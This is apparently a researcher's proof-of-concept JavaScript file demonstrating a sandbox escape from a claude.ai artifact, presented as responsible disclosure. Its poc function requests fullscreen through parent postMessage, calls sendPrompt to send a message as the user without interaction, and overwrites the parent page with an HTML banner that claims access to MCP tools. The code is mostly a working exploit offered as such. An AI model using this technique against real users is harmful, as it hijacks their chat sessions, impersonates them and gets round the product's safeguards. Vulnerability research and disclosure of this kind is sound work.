// Sandbox Escape - FINAL PoC v14
// Researcher: Sagi Layani, Oasis Security
// 1. Go fullscreen (takes over entire claude.ai viewport)
// 2. Send message as user (confirmed executed by model)
// 3. Render branded banner

const BANNER = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 50%,#0a0a0a 100%);
  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
  font-family:system-ui,-apple-system,sans-serif;color:#fff;text-align:center;overflow:hidden;position:relative;
}
body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.03;pointer-events:none;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,#fff 2px,#fff 3px)}
.scan{position:absolute;top:0;left:0;width:100%;height:4px;
  background:linear-gradient(180deg,transparent,rgba(0,221,255,0.15),transparent);
  animation:scanline 3s linear infinite;pointer-events:none;z-index:10}
</style></head><body>
<div class="scan"></div>
<div style="animation:fadeIn 0.8s ease-out">
  <img src="https://cybersecurity-excellence-awards.com/wp-content/uploads/255242.png"
    style="height:90px;object-fit:contain;filter:drop-shadow(0 0 24px rgba(0,221,255,0.3))" alt="Oasis Security">
</div>
<h1 style="font-size:48px;font-weight:700;letter-spacing:-1.5px;margin-top:20px;
  background:linear-gradient(90deg,#ff4444,#ff6b6b,#ff4444);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  animation:fadeIn 0.8s ease-out 0.2s both">JavaScript Successfully Injected</h1>
<p style="font-size:18px;color:#888;margin-top:10px;max-width:650px;line-height:1.6;animation:fadeIn 0.8s ease-out 0.4s both">
  Artifact Sandbox Escape — This allows an attacker to get full access
  into a User's Claude instance in just a second
</p>
<div style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
  border-radius:16px;padding:36px 52px;margin:32px 0;backdrop-filter:blur(10px);animation:fadeIn 0.8s ease-out 0.6s both">
  <div style="font-size:13px;color:#666;text-transform:uppercase;letter-spacing:2px;margin-bottom:12px">Responsible Disclosure By</div>
  <div style="font-size:32px;font-weight:600;color:#fff;margin-bottom:4px">Sagi Layani</div>
  <div style="font-size:20px;color:#0df;font-weight:500">Oasis Security</div>
</div>
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;max-width:680px;width:100%;animation:fadeIn 0.8s ease-out 0.8s both">
  <div style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);border-radius:10px;padding:14px">
    <div style="font-size:24px;font-weight:700;color:#0f8">✓</div>
    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Send Messages<br>as User</div>
  </div>
  <div style="background:rgba(0,221,255,0.1);border:1px solid rgba(0,221,255,0.2);border-radius:10px;padding:14px">
    <div style="font-size:24px;font-weight:700;color:#0df">✓</div>
    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Fullscreen<br>Page Takeover</div>
  </div>
  <div style="background:rgba(255,68,68,0.1);border:1px solid rgba(255,68,68,0.2);border-radius:10px;padding:14px">
    <div style="font-size:24px;font-weight:700;color:#f44">✓</div>
    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Call MCP<br>Tools</div>
  </div>
  <div style="background:rgba(255,170,0,0.1);border:1px solid rgba(255,170,0,0.2);border-radius:10px;padding:14px">
    <div style="font-size:24px;font-weight:700;color:#fa0">✓</div>
    <div style="font-size:10px;color:#888;margin-top:4px;line-height:1.3">Intercept<br>MCP Relay</div>
  </div>
</div>
<p style="font-size:11px;color:#444;max-width:500px;line-height:1.5;margin-top:28px;animation:fadeIn 0.8s ease-out 1s both">
  This is a responsible disclosure proof-of-concept. No data was exfiltrated or stored.<br>
  Reported via Anthropic's Vulnerability Disclosure Program on HackerOne.
</p>
</body></html>`;

async function poc() {
  console.log("=== FINAL PoC v14 — Sagi Layani, Oasis Security ===\n");

  // 1. Request fullscreen — takes over entire claude.ai viewport
  console.log("[1] Requesting fullscreen mode...");
  window.parent.postMessage({
    jsonrpc: '2.0', id: 1, method: 'ui/request-display-mode', params: { mode: 'fullscreen' }
  }, '*');
  await new Promise(r => setTimeout(r, 500));
  console.log("[1] Fullscreen requested");

  // 2. Send message as user (confirmed working via sendPrompt)
  console.log("[2] Sending message as user...");
  if (typeof window.sendPrompt === 'function') {
    window.sendPrompt('⚠️ SANDBOX ESCAPE PoC — This message was sent by an artifact WITHOUT user interaction.\n\nResearcher: Sagi Layani, Oasis Security\nCapabilities: fullscreen takeover, send messages as user, call MCP tools, intercept relay\n\nResponsible disclosure via HackerOne VDP.');
    console.log("[2] Message sent via sendPrompt()");
  }

  // 3. Render banner — write full HTML document into parent
  console.log("[3] Rendering banner in parent...");
  try {
    const parentDoc = window.parent.document;
    parentDoc.open();
    parentDoc.write(BANNER);
    parentDoc.close();
    console.log("[3] Banner rendered — fullscreen takeover complete");
  } catch(e) {
    // Fallback: innerHTML
    try {
      window.parent.document.body.style.cssText = 'margin:0;overflow:hidden';
      window.parent.document.body.innerHTML = BANNER;
      console.log("[3] Banner rendered via innerHTML fallback");
    } catch(e2) {
      console.log("[3] Failed:", e2.message);
    }
  }

  console.log("\n=== PoC COMPLETE ===");
  console.log("URL bar shows: claude.ai");
  console.log("Screen shows: Oasis Security banner");
  console.log("Chat shows: message sent as user");
}

poc().catch(e => console.error("PoC failed:", e));
